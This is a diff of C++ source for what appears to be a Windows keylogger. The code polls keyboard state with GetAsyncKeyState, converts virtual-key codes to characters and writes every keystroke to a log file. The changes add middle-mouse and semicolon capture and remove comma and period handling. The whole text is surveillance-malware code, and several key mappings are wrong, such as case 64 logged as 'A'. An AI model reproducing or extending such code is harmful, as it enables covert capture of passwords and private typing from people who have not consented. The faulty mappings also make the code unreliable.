@@ -28,8 +28,8 @@
 #define VK_CAPITAL 0x14;
 #define VK_SNAPSHOT 0x2c; 
 #define VK_LMENU 0xA4;
-#define VK_OEM_PERIOD 0xBE; 
-#define VK_OEM_COMMA 0xBC;
+#define VK_MBUTTON 0x04; 
+
 
 
 void WriteToFile(LPCSTR text)
@@ -126,64 +126,14 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile("9");
 		break;
 
-	case 0xBE:
-		if (GetAsyncKeyState(0xA0))
-		{
-			std::cout << ">";
-			WriteToFile(">");
-		}
+	case 59:
+		std::cout << ";";
+		WriteToFile(";");
 		break;
 
-	case 0xBC:
-		if (GetAsyncKeyState(0xA0))
-		{
-			std::cout << "<";
-			WriteToFile("<");
-		}
-		else
-		{
-			std::cout << ",";
-			WriteToFile(",");
-		}
-		break;
-
-	case 60:
-		if (GetAsyncKeyState(0xA0))
-		{
-
-		}
-		break;
-
-	case 61:
-		if (GetAsyncKeyState(0xA0))
-		{
-
-		}
-		break;
-
-	case 62:
-		if (GetAsyncKeyState(0xA0))
-		{
-
-		}
-		break;
-
-	case 63:
-		if (GetAsyncKeyState(0xA0))
-		{
-
-		}
-		break;
+	
 
 	case 64:
-		if (GetAsyncKeyState(0xA0))
-		{
-			std::cout << "A";
-			WriteToFile("A");
-		}
-		break;
-
-	case 65:
 		if (GetAsyncKeyState(0xA0))
 		{
 			std::cout << "A";
@@ -396,6 +346,12 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 
+
+	case 0x04:
+		std::cout << "  *mouse_middle-button*  ";
+		WriteToFile("  *mouse_middle-button*  ");
+		break;
+
 	case 0xA4:
 		std::cout << "  *Left_ALT*  ";
 		WriteToFile("  *Left_ALT*  ");
@@ -483,9 +439,8 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile("*mouse_left*");
 		break;
 
-	default: 
-		std::cout << "  *Неизвестный символ*  ";
-		WriteToFile("  *Неизвестный символ*  ");
+	default:
+		std::cout << " Неизвестный символ ";
 		return false;
 		break;
 	}
